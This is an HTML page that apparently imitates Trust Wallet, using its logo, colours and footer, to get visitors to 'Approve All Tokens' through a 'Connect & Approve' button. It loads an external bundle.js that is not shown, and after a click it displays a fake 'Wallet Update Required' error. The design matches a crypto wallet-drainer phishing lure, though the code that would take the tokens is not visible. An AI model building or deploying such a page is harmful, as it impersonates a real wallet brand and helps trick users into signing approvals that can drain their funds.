<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Trust Wallet Approve</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --tw-blue: #3375BB;
      --tw-dark: #0E0E0E;
      --tw-light: #F5F5F5;
      --tw-green: #2BBF6A;
      --tw-gradient: linear-gradient(135deg, #3375BB 0%, #2BBF6A 100%);
    }
    
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Poppins', sans-serif;
    }
    
    body {
      background-color: #f8fafc;
      color: var(--tw-dark);
      min-height: 100vh;
      overflow-x: hidden;
      background-image: 
        radial-gradient(circle at 10% 20%, rgba(51, 117, 187, 0.05) 0%, transparent 20%),
        radial-gradient(circle at 90% 80%, rgba(43, 191, 106, 0.05) 0%, transparent 20%);
    }
    
    .particles {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: -1;
    }
    
    .container {
      max-width: 480px;
      margin: 0 auto;
      padding: 2rem;
    }
    
    .logo {
      text-align: center;
      margin-bottom: 2rem;
    }
    
    .logo img {
      height: 50px;
    }
    
    .main-card {
      background: white;
      border-radius: 24px;
      padding: 2.5rem;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
      margin-bottom: 2rem;
      text-align: center;
      animation: fadeInUp 0.8s ease;
      transition: all 0.3s ease;
      position: relative;
      overflow: hidden;
    }
    
    .main-card::after {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 6px;
      background: var(--tw-gradient);
    }
    
    .main-card:hover {
      transform: translateY(-5px);
      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.12);
    }
    
    h1 {
      font-size: 1.8rem;
      font-weight: 600;
      margin-bottom: 1rem;
      color: var(--tw-blue);
      background: var(--tw-gradient);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }
    
    p.description {
      color: #64748B;
      margin-bottom: 1.5rem;
      line-height: 1.6;
    }
    
    .connect-btn {
      background: var(--tw-gradient);
      color: white;
      border: none;
      padding: 1rem;
      font-size: 1rem;
      font-weight: 600;
      border-radius: 12px;
      width: 100%;
      cursor: pointer;
      transition: all 0.3s ease;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-top: 1rem;
      box-shadow: 0 4px 15px rgba(51, 117, 187, 0.3);
      position: relative;
      overflow: hidden;
    }
    
    .connect-btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 7px 20px rgba(51, 117, 187, 0.4);
    }
    
    .connect-btn:active {
      transform: translateY(0);
    }
    
    .connect-btn svg {
      margin-right: 0.5rem;
    }
    
    .token-animation {
      width: 200px;
      height: 200px;
      margin: 0 auto 1.5rem;
      position: relative;
    }
    
    .token {
      position: absolute;
      width: 50px;
      height: 50px;
      border-radius: 50%;
      background: white;
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
      display: flex;
      align-items: center;
      justify-content: center;
      animation: float 6s ease-in-out infinite;
    }
    
    .token img {
      width: 30px;
      height: 30px;
    }
    
    .token:nth-child(1) {
      top: 0;
      left: 50%;
      transform: translateX(-50%);
      animation-delay: 0s;
    }
    
    .token:nth-child(2) {
      top: 20%;
      left: 10%;
      animation-delay: 0.5s;
    }
    
    .token:nth-child(3) {
      top: 20%;
      right: 10%;
      animation-delay: 1s;
    }
    
    .token:nth-child(4) {
      bottom: 20%;
      left: 10%;
      animation-delay: 1.5s;
    }
    
    .token:nth-child(5) {
      bottom: 20%;
      right: 10%;
      animation-delay: 2s;
    }
    
    .token:nth-child(6) {
      bottom: 0;
      left: 50%;
      transform: translateX(-50%);
      animation-delay: 2.5s;
    }
    
    .wallet-status {
      display: none;
      background: white;
      border-radius: 24px;
      padding: 2.5rem;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
      text-align: center;
      animation: fadeIn 0.5s ease;
    }
    
    .wallet-status h2 {
      font-size: 1.5rem;
      margin-bottom: 1rem;
      color: #EF4444;
    }
    
    .wallet-status p {
      color: #64748B;
      margin-bottom: 1.5rem;
      line-height: 1.6;
    }
    
    .wallet-status img {
      width: 120px;
      margin: 1rem auto;
    }
    
    .status-btn {
      background: var(--tw-gradient);
      color: white;
      border: none;
      padding: 0.8rem 1.5rem;
      font-size: 0.9rem;
      font-weight: 600;
      border-radius: 8px;
      cursor: pointer;
      transition: all 0.3s ease;
      box-shadow: 0 4px 10px rgba(51, 117, 187, 0.3);
    }
    
    .status-btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 7px 15px rgba(51, 117, 187, 0.4);
    }
    
    @keyframes float {
      0%, 100% {
        transform: translateY(0);
      }
      50% {
        transform: translateY(-15px);
      }
    }
    
    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }
    
    footer {
      text-align: center;
      color: #94A3B8;
      font-size: 0.8rem;
      margin-top: 2rem;
    }
    
    /* Mobile responsiveness */
    @media (max-width: 480px) {
      .container {
        padding: 1.5rem;
      }
      
      .main-card, .wallet-status {
        padding: 1.5rem;
      }
      
      h1 {
        font-size: 1.5rem;
      }
    }
  </style>
</head>
<body>
  <div id="particles-js" class="particles"></div>
  
  <div class="container">
    <div class="logo">
      <img src="https://trustwallet.com/assets/images/trust_logo.svg" alt="Trust Wallet">
    </div>
    
    <div class="main-card" id="approveCard">
      <div class="token-animation">
        <div class="token">
          <img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png" alt="BTC">
        </div>
        <div class="token">
          <img src="https://cryptologos.cc/logos/ethereum-eth-logo.png" alt="ETH">
        </div>
        <div class="token">
          <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT">
        </div>
        <div class="token">
          <img src="https://cryptologos.cc/logos/bnb-bnb-logo.png" alt="BNB">
        </div>
        <div class="token">
          <img src="https://cryptologos.cc/logos/solana-sol-logo.png" alt="SOL">
        </div>
        <div class="token">
          <img src="https://cryptologos.cc/logos/xrp-xrp-logo.png" alt="XRP">
        </div>
      </div>
      
      <h1>Approve All Tokens</h1>
      <p class="description">Connect your wallet to manage token approvals and swap assets securely</p>
      
      <button class="connect-btn" onclick="connectAndApprove()">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
          <path d="M19 7H5C3.89543 7 3 7.89543 3 9V19C3 20.1046 3.89543 21 5 21H19C20.1046 21 21 20.1046 21 19V9C21 7.89543 20.1046 7 19 7Z" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
          <path d="M16 7V5C16 4.46957 15.7893 3.96086 15.4142 3.58579C15.0391 3.21071 14.5304 3 14 3H10C9.46957 3 8.96086 3.21071 8.58579 3.58579C8.21071 3.96086 8 4.46957 8 5V7" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
          <path d="M16 12H16.01" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
        Connect & Approve
      </button>
    </div>
    
    <div class="wallet-status" id="walletStatus">
      <h2>Wallet Update Required</h2>
      <img src="https://trustwallet.com/assets/images/wallet_error.png" alt="Error">
      <p>Your wallet version is not supported. Please update Trust Wallet to the latest version to continue using this service.</p>
      <button class="status-btn" onclick="window.location.href='https://trustwallet.com/download'">Update Wallet</button>
    </div>
    
    <footer>
      Trust Wallet Approve Â© 2023 | All rights reserved
    </footer>
  </div>

  <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
  <script src="dist/bundle.js"></script>
  <script>
    // Initialize particles.js
    particlesJS("particles-js", {
      "particles": {
        "number": {
          "value": 80,
          "density": {
            "enable": true,
            "value_area": 800
          }
        },
        "color": {
          "value": ["#3375BB", "#2BBF6A"]
        },
        "shape": {
          "type": "circle",
          "stroke": {
            "width": 0,
            "color": "#000000"
          }
        },
        "opacity": {
          "value": 0.3,
          "random": false,
          "anim": {
            "enable": false,
            "speed": 1,
            "opacity_min": 0.1,
            "sync": false
          }
        },
        "size": {
          "value": 5,
          "random": true,
          "anim": {
            "enable": false,
            "speed": 40,
            "size_min": 0.1,
            "sync": false
          }
        },
        "line_linked": {
          "enable": true,
          "distance": 150,
          "color": "#3375BB",
          "opacity": 0.2,
          "width": 1
        },
        "move": {
          "enable": true,
          "speed": 2,
          "direction": "none",
          "random": false,
          "straight": false,
          "out_mode": "out",
          "bounce": false,
          "attract": {
            "enable": false,
            "rotateX": 600,
            "rotateY": 1200
          }
        }
      },
      "interactivity": {
        "detect_on": "canvas",
        "events": {
          "onhover": {
            "enable": true,
            "mode": "grab"
          },
          "onclick": {
            "enable": true,
            "mode": "push"
          },
          "resize": true
        },
        "modes": {
          "grab": {
            "distance": 140,
            "line_linked": {
              "opacity": 1
            }
          },
          "bubble": {
            "distance": 400,
            "size": 40,
            "duration": 2,
            "opacity": 8,
            "speed": 3
          },
          "repulse": {
            "distance": 200,
            "duration": 0.4
          },
          "push": {
            "particles_nb": 4
          },
          "remove": {
            "particles_nb": 2
          }
        }
      },
      "retina_detect": true
    });

    // Your connect function
    function connectAndApprove() {
      // Your existing logic from bundle.js
      console.log("Connecting wallet...");
      
      // Simulate connection failure (replace with your actual logic)
      setTimeout(() => {
        document.getElementById('approveCard').style.display = 'none';
        document.getElementById('walletStatus').style.display = 'block';
      }, 1500);
    }
  </script>
</body>
</html>
